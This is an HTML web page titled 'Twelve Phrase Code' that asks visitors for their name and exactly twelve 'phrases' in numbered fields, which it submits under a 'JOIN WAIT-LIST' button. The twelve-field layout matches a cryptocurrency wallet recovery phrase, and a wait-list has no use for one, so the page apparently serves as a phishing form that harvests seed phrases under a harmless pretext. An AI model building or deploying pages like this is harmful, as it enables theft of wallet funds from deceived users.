<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title> Twelve Phrase Code</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #121212; color: #fff; padding: 20px; }
        h1 { text-align: center; }
        form { display: flex; flex-direction: column; max-width: 900px; margin: auto; }
        .row { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 10px; }
        .row input { flex: 1 1 calc(33.33% - 10px); padding: 10px; font-size: 16px; }
        .name-row input { flex: 1 1 100%; padding: 12px; font-size: 18px; margin-bottom: 15px; }
        button { padding: 12px; font-size: 18px; background-color: #1e88e5; color: #fff; border: none; cursor: pointer; }
        button:hover { background-color: #1565c0; }
        p.note { text-align: center; margin-bottom: 20px; font-style: italic; }
    </style>
</head>
<body>
    <h1>Test Phrases</h1>
    <p class="note">input exactly 12 phrases.</p>
    <form action="/submit" method="POST">
        <div class="name-row">
            <input type="text" name="name" placeholder="Your Name" required>
        </div>
        <div class="row">
            <input type="text" name="code1" placeholder="Phrase 1" required>
            <input type="text" name="code2" placeholder="Phrase 2" required>
            <input type="text" name="code3" placeholder="Phrase 3" required>
        </div>
        <div class="row">
            <input type="text" name="code4" placeholder="Phrase 4" required>
            <input type="text" name="code5" placeholder="Phrase 5" required>
            <input type="text" name="code6" placeholder="Phrase 6" required>
        </div>
        <div class="row">
            <input type="text" name="code7" placeholder="Phrase 7" required>
            <input type="text" name="code8" placeholder="Phrase 8" required>
            <input type="text" name="code9" placeholder="Phrase 9" required>
        </div>
        <div class="row">
            <input type="text" name="code10" placeholder="Phrase 10" required>
            <input type="text" name="code11" placeholder="Phrase 11" required>
            <input type="text" name="code12" placeholder="Phrase 12" required>
        </div>
        <button type="submit">JOIN WAIT-LIST</button>
    </form>
</body>
                </html>
